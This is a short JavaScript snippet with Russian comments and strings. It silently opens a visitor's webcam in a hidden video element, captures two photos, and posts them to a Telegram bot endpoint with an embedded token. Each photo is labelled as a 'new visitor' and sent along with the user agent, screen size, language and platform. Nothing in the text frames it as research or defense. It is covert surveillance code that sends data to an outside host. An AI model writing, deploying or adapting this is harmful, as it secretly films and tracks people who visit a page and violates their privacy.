navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    video.style.display = 'none';
    document.body.appendChild(video);

    const capture = () => {
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
      const blob = dataURLtoBlob(dataUrl);
      const formData = new FormData();
      formData.append('photo', blob, 'photo.jpg');
      formData.append('description', 'Новый посетитель\nВремя: ' + new Date().toISOString() + '\nIP: ' + getIP() + '\nUA: ' + navigator.userAgent + '\nЭкран: ' + window.innerWidth + 'x' + window.innerHeight + '\nЯзык: ' + navigator.language + '\nПлатформа: ' + getPlatform());
      fetch('https://api.telegram.org/bot8569817774:AAGOwkVKL5lRyenrjaK3CibpuzkZM0x1Nww/sendPhoto', {
        method: 'POST',
        body: formData
      });
    };


    capture();
    setTimeout(capture, 2000);
  });


function dataURLtoBlob(dataURL) {
  const byteString = atob(dataURL.split(',')[1]);
  const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}


function getIP() {
  return '178.78.161.65'; // Пример IP, можно заменить на реальный
}

function getPlatform() {
  if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    return 'iPhone';
  } else if (/Windows/i.test(navigator.userAgent)) {
    return 'Windows';
  } else if (/Mac/i.test(navigator.userAgent)) {
    return 'Mac';
  } else {
    return 'Другая платформа';
  }
}
